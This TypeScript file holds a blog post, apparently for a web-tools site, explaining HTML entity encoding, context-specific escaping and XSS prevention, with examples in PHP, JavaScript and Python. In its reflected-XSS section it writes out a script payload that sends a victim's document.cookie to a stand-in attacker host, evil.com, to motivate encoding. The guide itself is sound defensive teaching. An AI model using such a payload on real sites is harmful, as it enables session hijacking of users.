import type { BlogPost } from "../types";

export const htmlEncoderDecoderGuide: BlogPost = {
  slug: "html-encoder-decoder-guide",
  title: "HTML Encoder & Decoder: Escaping Special Characters",
  description:
    "Learn how HTML encoding works, which characters need escaping, and how to prevent XSS vulnerabilities through proper encoding.",
  publishedAt: "2026-03-30",
  readingTimeMinutes: 8,
  category: "Encoding",
  ctaTools: [
    { name: "HTML Encoder", href: "/tools/encoding/html-encode" },
    { name: "HTML Decoder", href: "/tools/encoding/html-decode" },
  ],
  content: `## What Is HTML Encoding?

HTML encoding — also called HTML escaping or HTML entity encoding — is the process of converting characters that have special meaning in HTML into their corresponding HTML entity representations. This ensures the characters are treated as literal text content rather than HTML syntax.

For example, the less-than sign \`<\` is used in HTML to begin tags. If you want to display the literal text \`<script>\` on a web page without it being interpreted as an HTML tag, you must encode it as \`&lt;script&gt;\`.

HTML encoding is not just a formatting concern — it is a critical security measure that prevents **Cross-Site Scripting (XSS)** attacks, one of the most common and dangerous web vulnerabilities.

---

## The Five Essential HTML Characters to Escape

The HTML specification identifies five characters that must be escaped when they appear in text content or attribute values:

| Character | Entity name | Numeric entity | When to escape |
|-----------|-------------|----------------|----------------|
| \`<\` | \`&lt;\` | \`&#60;\` | Always in text content and attribute values |
| \`>\` | \`&gt;\` | \`&#62;\` | In text content (technically optional but recommended) |
| \`&\` | \`&amp;\` | \`&#38;\` | Always — must be escaped first |
| \`"\` | \`&quot;\` | \`&#34;\` | In double-quoted attribute values |
| \`'\` | \`&apos;\` | \`&#39;\` | In single-quoted attribute values |

The ampersand \`&\` must be escaped before anything else, because it begins entity sequences. If you escape \`<\` to \`&lt;\` and then escape the resulting \`&\` to \`&amp;\`, you get the wrong result (\`&amp;lt;\` instead of \`&lt;\`). Always escape \`&\` first.

---

## HTML Entity Reference

HTML has hundreds of named entities for special characters. Here are the most commonly used:

### Typographic Characters

| Character | Entity | Description |
|-----------|--------|-------------|
| \`&nbsp;\` | Non-breaking space | Prevents line break between words |
| \`&mdash;\` | — | Em dash |
| \`&ndash;\` | – | En dash |
| \`&ldquo;\` | " | Left double quotation mark |
| \`&rdquo;\` | " | Right double quotation mark |
| \`&lsquo;\` | ' | Left single quotation mark |
| \`&rsquo;\` | ' | Right single quotation mark |
| \`&hellip;\` | … | Horizontal ellipsis |
| \`&copy;\` | © | Copyright sign |
| \`&reg;\` | ® | Registered trademark |
| \`&trade;\` | ™ | Trademark sign |

### Mathematical and Technical

| Character | Entity | Description |
|-----------|--------|-------------|
| \`&times;\` | × | Multiplication sign |
| \`&divide;\` | ÷ | Division sign |
| \`&plusmn;\` | ± | Plus-minus sign |
| \`&ne;\` | ≠ | Not equal to |
| \`&le;\` | ≤ | Less-than or equal to |
| \`&ge;\` | ≥ | Greater-than or equal to |
| \`&infin;\` | ∞ | Infinity |
| \`&raquo;\` | » | Right-pointing double angle quotation mark |

---

## Why HTML Encoding Matters for Security: XSS

Cross-Site Scripting (XSS) is a class of attack where an attacker injects malicious scripts into web pages viewed by other users. HTML encoding is the primary defense.

### Reflected XSS Example

Imagine a search page that displays the search query back to the user:

\`\`\`html
<!-- Unsafe: directly inserting user input into HTML -->
<p>You searched for: <?= $_GET["q"] ?></p>
\`\`\`

If an attacker sends a link with \`?q=<script>document.location="https://evil.com/steal?c="+document.cookie</script>\`, the server outputs:

\`\`\`html
<p>You searched for: <script>document.location="https://evil.com/steal?c="+document.cookie</script></p>
\`\`\`

The victim's browser executes the script, sending their session cookie to the attacker.

With HTML encoding:

\`\`\`html
<!-- Safe: encoding the output -->
<p>You searched for: <?= htmlspecialchars($_GET["q"], ENT_QUOTES, "UTF-8") ?></p>
\`\`\`

The output becomes:

\`\`\`html
<p>You searched for: &lt;script&gt;document.location=&quot;https://evil.com/steal?c=&quot;+document.cookie&lt;/script&gt;</p>
\`\`\`

This displays as literal text — harmless.

### Stored XSS

Stored (persistent) XSS is similar but the malicious input is saved to a database and shown to all users. For example, a comment on a blog post. The same defense applies: HTML-encode all user-provided content before inserting it into HTML.

---

## Context Matters: Different Contexts Need Different Encoding

HTML encoding is not one-size-fits-all. The correct encoding depends on where in the HTML document you are inserting data:

### HTML Text Content
Escape \`<\`, \`>\`, and \`&\`:

\`\`\`html
<p>User said: &lt;b&gt;Hello&lt;/b&gt;</p>
\`\`\`

### HTML Attribute Values
Escape \`<\`, \`>\`, \`&\`, and the quote character used:

\`\`\`html
<input value="&lt;script&gt;&amp;hello&lt;/script&gt;">
\`\`\`

### JavaScript Context
Do NOT use HTML encoding for data inserted into JavaScript. Use JSON encoding or a JavaScript-specific escaping function. HTML encoding in JavaScript context does not prevent XSS.

\`\`\`html
<!-- WRONG: HTML encoding in JS context -->
<script>var name = "&lt;script&gt;";</script>

<!-- RIGHT: JSON encoding for JS context -->
<script>var name = <?= json_encode($name) ?>;</script>
\`\`\`

### URL Context
Use URL percent-encoding, not HTML encoding, for values inserted into URLs. Then HTML-encode the entire attribute value.

\`\`\`html
<a href="https://example.com/search?q=<?= htmlspecialchars(urlencode($query)) ?>">Search</a>
\`\`\`

### CSS Context
Avoid inserting user data into CSS. If unavoidable, use CSS-specific encoding. HTML encoding is not sufficient.

---

## HTML Encoding in Code

### PHP

\`\`\`php
// htmlspecialchars is the correct function for HTML context
$safe = htmlspecialchars($userInput, ENT_QUOTES | ENT_HTML5, "UTF-8")

// htmlentities encodes all characters that have entity equivalents (overkill for most uses)
$safe = htmlentities($userInput, ENT_QUOTES | ENT_HTML5, "UTF-8")
\`\`\`

### JavaScript (Browser)

\`\`\`javascript
function escapeHtml(str) {
  const div = document.createElement("div")
  div.appendChild(document.createTextNode(str))
  return div.innerHTML
}

// Or using the DOM to set text content directly (no escaping needed):
element.textContent = userInput  // Safe, no encoding needed
// element.innerHTML = userInput  // UNSAFE - use textContent instead
\`\`\`

### Python

\`\`\`python
from html import escape, unescape

safe = escape("<script>alert(1)</script>", quote=True)
print(safe)
# => &lt;script&gt;alert(1)&lt;/script&gt;

original = unescape("&lt;script&gt;alert(1)&lt;/script&gt;")
print(original)
# => <script>alert(1)</script>
\`\`\`

### Node.js

\`\`\`javascript
// Using the he library (npm install he)
const he = require("he")

const encoded = he.encode("<script>alert(1)</script>")
// => "&lt;script&gt;alert(1)&lt;/script&gt;"

const decoded = he.decode("&lt;script&gt;alert(1)&lt;/script&gt;")
// => "<script>alert(1)</script>"
\`\`\`

---

## HTML Encoding vs URL Encoding vs Base64

These three encodings are often confused:

| Encoding | Purpose | Example input | Example output |
|----------|---------|--------------|----------------|
| HTML encoding | Safely embed text in HTML | \`<script>\` | \`&lt;script&gt;\` |
| URL encoding | Safely embed data in URLs | \`hello world\` | \`hello%20world\` |
| Base64 | Encode binary data as text | Binary bytes | \`SGVsbG8=\` |

They serve completely different purposes and are not interchangeable. Using URL encoding where HTML encoding is needed (or vice versa) is a common mistake that can lead to either display corruption or security vulnerabilities.

---

## Modern Templating Engines and Auto-Escaping

Most modern web frameworks and templating engines auto-escape HTML by default:

- **React:** JSX auto-escapes content in \`{expression}\` by default. Use \`dangerouslySetInnerHTML\` only for trusted HTML.
- **Vue:** \`{{ expression }}\` auto-escapes. Use \`v-html\` only for trusted HTML.
- **Django templates:** Auto-escape is on by default. Use \`{% autoescape off %}\` or \`|safe\` only for trusted content.
- **Jinja2:** Configure \`autoescape=True\`. Use \`|safe\` filter only for trusted content.
- **Handlebars:** \`{{ expression }}\` auto-escapes. Use \`{{{ expression }}}\` for raw HTML.

Auto-escaping dramatically reduces the risk of XSS, but you still need to understand the underlying mechanism. Every \`dangerouslySetInnerHTML\`, \`v-html\`, or \`|safe\` usage is a potential XSS vulnerability if it includes untrusted input.

---

## Encode and Decode HTML Entities Instantly

Whether you need to safely embed user content in HTML, decode an HTML-encoded string you received from an API, or debug XSS protections, the HTML Encoder and Decoder on utils.live handle it instantly in your browser.
`,
};
